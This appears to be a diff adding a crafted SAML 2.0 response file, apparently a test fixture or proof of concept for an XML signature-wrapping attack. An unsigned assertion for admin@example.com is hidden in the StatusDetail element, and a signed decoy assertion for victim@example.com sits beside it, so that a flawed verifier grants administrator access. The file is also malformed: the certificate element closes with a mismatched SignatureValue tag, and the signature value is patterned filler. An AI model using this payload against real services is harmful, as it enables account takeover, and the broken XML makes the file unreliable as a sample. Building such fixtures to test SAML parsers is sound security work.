@@ -1,0 +1,74 @@
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
+                Destination="http://example.com/saml/acs"
+                ID="_a12345"
+                Version="2.0"
+                IssueInstant="2025-11-22T00:15:00Z">
+  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+  <samlp:Status>
+    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+    <samlp:StatusDetail>
+      <!-- 1. The "Evil" Unsigned Assertion, hidden to pass schema validation -->
+      <saml:Assertion Version="2.0" ID="id_evil_assertion" IssueInstant="2025-11-22T00:15:00Z">
+        <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+        <saml:Subject>
+          <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@example.com</saml:NameID>
+          <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+            <saml:SubjectConfirmationData NotOnOrAfter="2025-11-22T00:20:00Z" Recipient="http://example.com/saml/acs"/>
+          </saml:SubjectConfirmation>
+        </saml:Subject>
+        <saml:Conditions NotBefore="2025-11-22T00:10:00Z" NotOnOrAfter="2025-11-22T00:20:00Z">
+          <saml:AudienceRestriction>
+            <saml:Audience>http://example.com/saml/metadata</saml:Audience>
+          </saml:AudienceRestriction>
+        </saml:Conditions>
+        <saml:AuthnStatement AuthnInstant="2025-11-22T00:15:00Z">
+          <saml:AuthnContext>
+            <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
+          </saml:AuthnContext>
+        </saml:AuthnStatement>
+      </saml:Assertion>
+    </samlp:StatusDetail>
+  </samlp:Status>
+
+  <!-- 2. The Correctly Signed "Decoy" Assertion -->
+  <saml:Assertion Version="2.0" ID="id_signed_decoy" IssueInstant="2025-11-22T00:15:00Z">
+    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+      <ds:SignedInfo>
+        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+        <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
+        <ds:Reference URI="#id_signed_decoy">
+          <ds:Transforms>
+            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
+            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+          </ds:Transforms>
+          <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
+          <ds:DigestValue>S7a2iDRyD6BNdJ4F3h2aTqkD35U=</ds:DigestValue>
+        </ds:Reference>
+      </ds:SignedInfo>
+      <ds:SignatureValue>iAvQPKdMGBs2BT0vLhF/BpbQ55w5N1M2P5zT5Xqj+g8E4Z6k4Z7l8Y8l9L0n9o1p3q5r7s9t/v0x/z+B2D4F6G8I+K+M+N+P+R+T+V+X+Z+b+d+f+h+j+l+n+p+r+t+v+x/z=</ds:SignatureValue>
+      <ds:KeyInfo>
+        <ds:X509Data>
+          <ds:X509Certificate>MIICZDCCAc2gAwIBAgIBADANBgkqhkiG9w0BAQ0FADBPMQswCQYDVQQGEwJ1czEUMBIGA1UECAwLZXhhbXBsZS5jb20xFDASBgNVBAoMC2V4YW1wbGUuY29tMRQwEgYDVQQDDAtleGFtcGxlLmNvbTAeFw0yNTExMjEyMzM4MThaFw0zNTExMTkyMzM4MThaME8xCzAJBgNVBAYTAnVzMRQwEgYDVQQIDAtleGFtcGxlLmNvbTEUMBIGA1UECgwLZXhhbXBsZS5jb20xFDASBgNVBAMMC2V4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrujq+KXddSKM7KZHeERWPbGMDBRCPu2G0u1IcQaGsNLLlotdT7LG98f8V0aHJlQculgE/jjNzmDeOYlu6MVOqz1LuYTupToIwqQF7vJIXSBVRL8oS7oysYFi+BiA59D2vJy6TpENo7T/evWq7TOxFkxUvhu/R0v26vbRyJ3sjJwIDAQABo1AwTjAdBgNVHQ4EFgQUq1UNohqTxoPkcrhAlKN+tZqyDgIwHwYDVR0jBBgwFoAUq1UNohqTxoPkcrhAlKN+tZqyDgIwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQCJAv0p2W147R0mwKgse3OI0P/YN7kh9pZAXEq9TS46cjEsvlPL7PmYxD8tSDFwTsuOd1e4vjY6sMRm3zbxLNkzv6fehp46o7CJLu1rhHxVgY4CDxkNfptJaSOlueuiFnNyMK3Ux/Ks5k+dvpAXrc3gztwmlVYPYpKdhuwrTqxzHA==</ds:SignatureValue>
+        </ds:X509Data>
+      </ds:KeyInfo>
+    </ds:Signature>
+    <saml:Subject>
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">victim@example.com</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2025-11-22T00:20:00Z" Recipient="http://example.com/saml/acs"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2025-11-22T00:10:00Z" NotOnOrAfter="2025-11-22T00:20:00Z">
+      <saml:AudienceRestriction>
+        <saml:Audience>http://example.com/saml/metadata</saml:Audience>
+      </saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AuthnStatement AuthnInstant="2025-11-22T00:15:00Z">
+      <saml:AuthnContext>
+        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
+      </saml:AuthnContext>
+    </saml:AuthnStatement>
+  </saml:Assertion>
+</samlp:Response>
